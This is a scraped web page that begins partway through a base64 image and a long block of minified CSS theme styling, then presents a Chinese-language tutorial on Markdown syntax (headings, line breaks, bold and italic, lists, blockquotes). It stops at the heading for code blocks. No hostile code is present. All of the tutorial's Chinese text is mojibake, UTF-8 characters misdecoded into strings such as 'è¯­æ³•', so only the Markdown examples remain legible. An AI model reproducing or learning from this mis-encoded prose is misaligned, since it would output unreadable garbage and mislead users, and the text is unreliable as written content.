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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"â";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"â";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="an-old-hope">.hljs-comment,.hljs-quote{color:#b6b18b}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#eb3c54}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#e7ce56}.hljs-attribute{color:#ee7c2b}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#4fb4d7}.hljs-section,.hljs-title{color:#78bb65}.hljs-keyword,.hljs-selector-tag{color:#b45ea4}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1c1d21;color:#c0c5ce}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Markdown è¯­æ³•è¯¦ç»†æ•™ç¨‹</h2>
<p>Markdown æ˜¯ä¸€ç§<strong>è½»é‡çº§æ ‡è®°è¯­è¨€</strong>ï¼Œç”¨çº¯æ–‡æœ¬å°±èƒ½å†™å‡ºç»“æ„æ¸…æ™°ã€æ ¼å¼ç¾è§‚çš„æ–‡æ¡£ï¼Œå¹¶å¯ä»¥æ–¹ä¾¿åœ°è½¬æ¢æˆ HTMLã€PDF ç­‰æ ¼å¼ã€‚æœ¬æ•™ç¨‹ä¸»è¦ä»¥å¸¸ç”¨çš„ GitHub / VSCode / Gitee ç­‰ç¯å¢ƒå…¼å®¹çš„è¯­æ³•ä¸ºä¸»ã€‚</p>
<hr/>
<h2 data-id="heading-1">1. æ ‡é¢˜ï¼ˆHeadingï¼‰</h2>
<ul>
<li><strong>è¯­æ³•</strong>ï¼šåœ¨è¡Œé¦–ä½¿ç”¨ <code>#</code> åŠ ç©ºæ ¼ï¼Œ<code>#</code> çš„ä¸ªæ•°è¡¨ç¤ºæ ‡é¢˜çº§åˆ«ï¼ˆ1â€“6 çº§ï¼‰ã€‚</li>
</ul>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># ä¸€çº§æ ‡é¢˜</span>
<span class="hljs-section">## äºŒçº§æ ‡é¢˜</span>
<span class="hljs-section">### ä¸‰çº§æ ‡é¢˜</span>
<span class="hljs-section">#### å››çº§æ ‡é¢˜</span>
<span class="hljs-section">##### äº”çº§æ ‡é¢˜</span>
<span class="hljs-section">###### å…­çº§æ ‡é¢˜</span>
</code></pre>
<ul>
<li><strong>æ³¨æ„ç‚¹</strong>ï¼š
<ul>
<li><code>#</code> åé¢<strong>æ¨èåŠ ä¸€ä¸ªç©ºæ ¼</strong>ï¼Œå…¼å®¹æ€§æ›´å¥½ã€‚</li>
<li>ä¸€çº§ã€äºŒçº§æ ‡é¢˜é€šå¸¸ç”¨äºæ–‡æ¡£ç»“æ„çš„å¤§çº²ï¼Œä¸è¦æ»¥ç”¨ã€‚</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-2">2. æ®µè½ä¸æ¢è¡Œ</h2>
<ul>
<li><strong>æ®µè½</strong>ï¼šæ™®é€šæ–‡æœ¬ç›´æ¥å†™ï¼Œä¸­é—´ç©ºä¸€è¡Œè¡¨ç¤ºåˆ†æ®µã€‚</li>
<li><strong>æ¢è¡Œ</strong>ï¼šè¡Œå°¾åŠ ä¸¤ä¸ªç©ºæ ¼ï¼Œç„¶åå›è½¦ï¼Œæˆ–è€…ä½¿ç”¨ <code>&lt;br&gt;</code>ã€‚</li>
</ul>
<pre><code class="hljs language-markdown" lang="markdown">è¿™æ˜¯ä¸€æ®µæ–‡å­—ã€‚  
è¿™ä¸€å¥ä¸ä¸Šä¸€å¥ä¹‹é—´æ˜¯â€œæ¢è¡Œâ€ï¼Œä¸æ˜¯æ–°æ®µè½ã€‚

è¿™æ˜¯æ–°çš„ä¸€æ®µï¼ˆä¸­é—´ç©ºäº†ä¸€è¡Œï¼‰ã€‚
</code></pre>
<hr/>
<h2 data-id="heading-3">3. å­—ä½“æ ·å¼</h2>
<ul>
<li><strong>ç²—ä½“</strong>ï¼š<code>**åŠ ç²—å†…å®¹**</code> æˆ– <code>__åŠ ç²—å†…å®¹__</code></li>
<li><strong>æ–œä½“</strong>ï¼š<code>*æ–œä½“å†…å®¹*</code> æˆ– <code>_æ–œä½“å†…å®¹_</code></li>
<li><strong>ç²—æ–œä½“</strong>ï¼š<code>***ç²—æ–œä½“å†…å®¹***</code></li>
<li><del>åˆ é™¤çº¿</del>ï¼š<code>~~åˆ é™¤çš„å†…å®¹~~</code></li>
<li>ä¸‹åˆ’çº¿ï¼ˆä¸æ˜¯æ ‡å‡† Markdownï¼Œä½†å¾ˆå¤šæ¸²æŸ“å™¨æ”¯æŒ HTMLï¼‰ï¼š<code>&lt;u&gt;å¸¦ä¸‹åˆ’çº¿çš„æ–‡æœ¬&lt;/u&gt;</code></li>
</ul>
<pre><code class="hljs language-markdown" lang="markdown">è¿™æ˜¯ <span class="hljs-strong">**åŠ ç²—**</span> çš„æ–‡å­—ã€‚
è¿™æ˜¯ <span class="hljs-emphasis">*æ–œä½“*</span> çš„æ–‡å­—ã€‚
è¿™æ˜¯ <span class="hljs-strong">**<span class="hljs-emphasis">*ç²—æ–œä½“*</span>**</span> çš„æ–‡å­—ã€‚
è¿™æ˜¯ ~~åˆ é™¤çº¿~~ æ•ˆæœã€‚
è¿™æ˜¯ <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">u</span>&gt;</span></span>ä¸‹åˆ’çº¿<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">u</span>&gt;</span></span> æ•ˆæœã€‚
</code></pre>
<hr/>
<h2 data-id="heading-4">4. åˆ—è¡¨ï¼ˆæœ‰åº / æ— åº / åµŒå¥—ï¼‰</h2>
<h3 data-id="heading-5">4.1 æ— åºåˆ—è¡¨</h3>
<ul>
<li><strong>è¯­æ³•</strong>ï¼šä»¥ <code>-</code>ã€<code>*</code> æˆ– <code>+</code> åŠ ç©ºæ ¼å¼€å¤´ï¼Œæ•ˆæœç›¸åŒï¼Œæ¨èç»Ÿä¸€ä½¿ç”¨ <code>-</code>ã€‚</li>
</ul>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">-</span> æ— åºé¡¹ 1
<span class="hljs-bullet">-</span> æ— åºé¡¹ 2
<span class="hljs-bullet">  -</span> å­é¡¹ 2.1
<span class="hljs-bullet">  -</span> å­é¡¹ 2.2
</code></pre>
<h3 data-id="heading-6">4.2 æœ‰åºåˆ—è¡¨</h3>
<ul>
<li><strong>è¯­æ³•</strong>ï¼šä½¿ç”¨æ•°å­—åŠ ç‚¹åŠ ç©ºæ ¼ï¼Œå¦‚ <code>1. </code>ã€‚</li>
</ul>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> æœ‰åºé¡¹ 1
<span class="hljs-bullet">2.</span> æœ‰åºé¡¹ 2
<span class="hljs-bullet">3.</span> æœ‰åºé¡¹ 3
</code></pre>
<ul>
<li>æ•°å­—é¡ºåºåœ¨å¤§å¤šæ•°æ¸²æŸ“å™¨ä¸­å¯è‡ªåŠ¨çº æ­£ï¼Œä½†<strong>å»ºè®®å†™çœŸå®é¡ºåº</strong>ï¼Œæ–¹ä¾¿é˜…è¯»å’Œ diffã€‚</li>
</ul>
<h3 data-id="heading-7">4.3 æ··åˆ / åµŒå¥—åˆ—è¡¨ç¤ºä¾‹</h3>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> ä¸€çº§æœ‰åº
<span class="hljs-bullet">   -</span> åµŒå¥—æ— åº 1
<span class="hljs-bullet">   -</span> åµŒå¥—æ— åº 2
<span class="hljs-bullet">2.</span> ç¬¬äºŒé¡¹
<span class="hljs-bullet">   1.</span> å†…éƒ¨æœ‰åº 2.1
<span class="hljs-bullet">   2.</span> å†…éƒ¨æœ‰åº 2.2
</code></pre>
<blockquote>
<p>æ³¨æ„ï¼šåµŒå¥—åˆ—è¡¨éœ€è¦<strong>ç¼©è¿›ä¸¤ä¸ªæˆ–å››ä¸ªç©ºæ ¼</strong>ï¼ˆæˆ–ä¸€ä¸ªåˆ¶è¡¨ç¬¦ï¼‰ï¼Œé€šå¸¸æ¨èä¸¤ä¸ªç©ºæ ¼æˆ–å››ä¸ªç©ºæ ¼ä¿æŒé£æ ¼ç»Ÿä¸€ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-8">5. å¼•ç”¨ï¼ˆBlockquoteï¼‰</h2>
<ul>
<li><strong>è¯­æ³•</strong>ï¼šåœ¨è¡Œé¦–ä½¿ç”¨ <code>&gt;</code>ï¼ˆå¤§äºå·ï¼‰åŠ ç©ºæ ¼ã€‚</li>
</ul>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-quote">&gt; è¿™æ˜¯ä¸€æ®µå¼•ç”¨æ–‡å­—ã€‚</span>
<span class="hljs-quote">&gt; å¯ä»¥æ¢è¡Œç»§ç»­å†™ï¼Œä»ç„¶å±äºåŒä¸€ä¸ªå¼•ç”¨ã€‚</span>

<span class="hljs-quote">&gt; ä¹Ÿå¯ä»¥</span>
&gt;&gt; åµŒå¥—å¼•ç”¨ï¼ˆä¸¤å±‚ï¼‰
</code></pre>
<ul>
<li>å¼•ç”¨å†…å¯ä»¥åŒ…å«<strong>æ ‡é¢˜ã€åˆ—è¡¨ã€ä»£ç å—ç­‰</strong>ï¼Œå¸¸ç”¨äºå¼•ç”¨ä»–äººè§‚ç‚¹ã€æç¤ºä¿¡æ¯ç­‰ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-9">6. ä»£ç ä¸ä»£ç å—</h2>
